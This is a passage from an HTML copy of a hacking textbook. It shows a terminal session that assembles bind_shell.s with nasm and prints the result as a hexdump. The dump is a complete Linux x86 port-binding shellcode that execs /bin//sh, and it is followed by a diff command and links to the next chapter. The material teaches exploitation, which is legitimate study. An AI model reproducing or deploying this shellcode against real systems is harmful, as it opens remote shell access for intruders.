19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nasm bind_shell.s reader@hacking:~/booksrc $ hexdump -C bind_shell</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000000 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.  |</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010 96 6a 66 58 43 52 66 68 7a 69 66 53 89 e1 6a 10 |.jfXCRfhzifS..j.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020 51 56 89 e1 cd 80 b0 66 43 43 53 56 89 e1 cd 80 |QV.....fCCSV.  |</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000030 b0 66 43 52 52 56 89 e1 cd 80 93 6a 02 59 b0 3f |.fCRRV   j.Y.?|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000040 cd 80 49 79 f9 b0 0b 52 68 2f 2f 73 68 68 2f 62 |..Iy. Rh//shh/b|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000050 69 6e 89 e3 52 89 e2 53 89 e1 cd 80       |in..R..S.  |</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0000005c</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ diff bind_shell portbinding_shellcode</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_972.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part127.htm">0x550 Connect-Back Shellcode</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part125.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part127.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
